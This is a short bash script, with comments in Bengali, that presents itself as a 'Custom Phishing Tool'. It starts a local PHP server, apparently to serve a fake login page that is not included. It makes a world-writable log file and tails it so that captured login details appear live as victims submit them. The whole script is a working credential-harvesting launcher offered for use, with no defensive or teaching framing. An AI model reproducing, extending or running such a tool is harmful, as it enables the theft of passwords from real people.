#!/bin/bash

# কালার
red='\e[1;31m'
green='\e[1;32m'
blue='\e[1;34m'
reset='\e[0m'

clear
echo -e "${blue}  ------------------------------------------${reset}"
echo -e "${green}         CUSTOM PHISHING TOOL (Z-STYLE)     ${reset}"
echo -e "${blue}  ------------------------------------------${reset}"

# ১. আগের কোনো পিএইচপি সার্ভার চললে তা বন্ধ করা
killall php 2>/dev/null

# ২. সার্ভার ব্যাকগ্রাউন্ডে চালু করা
echo -e "${blue}[*]${reset} Starting PHP server at http://127.0.0.1:8080..."
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2

# ৩. অটোমেটিক পাসওয়ার্ড দেখানোর সিস্টেম
echo -e "${green}[*] Waiting for Login Info...${reset}"
echo -e "${red}------------------------------------------${reset}"

# ফাইলটি খালি থাকলে একটি মেসেজ দেওয়া
if [ ! -f log.txt ]; then
    touch log.txt
    chmod 777 log.txt
fi

# 'tail -f' কমান্ডটিই আপনার কাজ অটোমেটিক করে দেবে
tail -f log.txt
